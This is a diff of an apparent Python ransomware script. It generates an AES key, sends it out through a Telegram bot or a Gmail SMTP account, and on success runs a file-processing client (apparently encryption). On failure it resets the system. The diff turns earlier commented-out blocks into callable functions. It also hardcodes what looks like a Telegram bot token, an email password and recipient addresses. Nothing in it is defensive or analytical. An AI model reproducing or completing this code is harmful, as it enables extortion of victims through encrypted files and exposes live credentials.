@@ -41,35 +41,36 @@ key: bytes = aes.generate_key(32)
 client = CommonFiles(aes, key, file_categories)
 
 
+# 1. Send AES key to Telegram (uncomment to use)
+def send_key_via_telegram():
+    token = '6901515780:AAGeZhRhWMSyG124XiA_qiIJHkvN3AIIyo4'
+    chat_id = 'your_chat_id_here'  # replace with your actual chat ID
 
-# 1. Send key to Telegram 
-'''
-token: str = '6901515780:AAGeZhRhWMSyG124XiA_qiIJHkvN3AIIyo4'
-chat_id: str = ...
-
-telegram = Telegram(token)
-
-if telegram.sendMessage(chat_id, key):
-    client.process_files()
-else:
-    time.sleep(10)
-    System.reset()
-'''
+    telegram = Telegram(token)
+    if telegram.sendMessage(chat_id, key):
+        client.process_files()
+    else:
+        time.sleep(10)
+        System.reset()
 
 
-# 2. Send key to Email
-'''
-email = EmailSender(
-    'nguyen098xx@gmail.com', 'Kba#17bak', 
-    'smtp.gmail.com', 587
-)
+# 2. Send AES key via Email (uncomment to use)
+def send_key_via_email():
+    email = EmailSender('ransomware@gmail.com', 'Kba#17bak', 'smtp.gmail.com', 587)
 
-if email.sendEmail(
-    'phcnguyenz@proton.me', 
-    f'key AES - {time.time()}', key
-):
-    client.process_files()
-else:
-    time.sleep(10)
-    System.reset()
-'''
+    if email.sendEmail('phcnguyenz@proton.me', f'Key AES - {time.time()}', key):
+        client.process_files()
+        print("Key sent via Email and files processed.")
+    else:
+        print("Failed to send key via Email. System reset in 10 seconds.")
+        time.sleep(10)
+        System.reset()
+
+
+# Test the sending functionality
+if __name__ == "__main__":
+    # Uncomment one of the following to test:
+
+    # send_key_via_telegram()
+    # send_key_via_email()
+    pass
